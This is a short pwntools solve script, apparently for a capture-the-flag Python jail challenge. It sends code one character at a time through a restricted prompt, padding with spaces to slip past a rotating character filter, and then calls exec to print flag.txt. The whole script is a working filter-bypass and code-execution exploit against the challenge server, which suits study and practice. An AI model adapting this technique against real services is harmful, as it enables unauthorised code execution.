from pwn import *

conn = process("server.py") # use remote(HOST, PORT) for remote solve
command = "print(open('flag.txt').read())"

conn.recvuntil(">>>")
conn.sendline('a = ""'.encode())

for char in command:
    conn.recvuntil(">>>")
    payload = "a+="
    window = set("abcdefghijklm")
    for _ in range(3):
        window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window)
    if char.isalpha():
        while char not in window:
            window = set(chr((ord(a) - ord("a") + 1) % 26 + ord("a")) for a in window)
            payload += " "

    payload += 25 * " "
    payload += '"'
    payload += char
    payload += '"'

    conn.sendline(payload.encode())

conn.sendline("b =                2;exec(a)".encode())

print("getting the flag now:")
print(conn.recvline().decode().strip().replace(">>> ", ""))
